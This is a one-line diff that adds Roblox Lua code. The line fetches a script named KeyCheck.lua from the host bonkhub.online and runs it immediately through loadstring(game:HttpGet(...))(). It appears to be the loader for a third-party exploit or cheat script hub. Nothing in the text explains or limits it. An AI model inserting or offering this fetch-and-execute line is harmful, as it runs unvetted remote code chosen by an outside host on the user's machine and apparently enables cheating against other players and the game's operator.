@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://bonkhub.online/KeyCheck.lua"))()
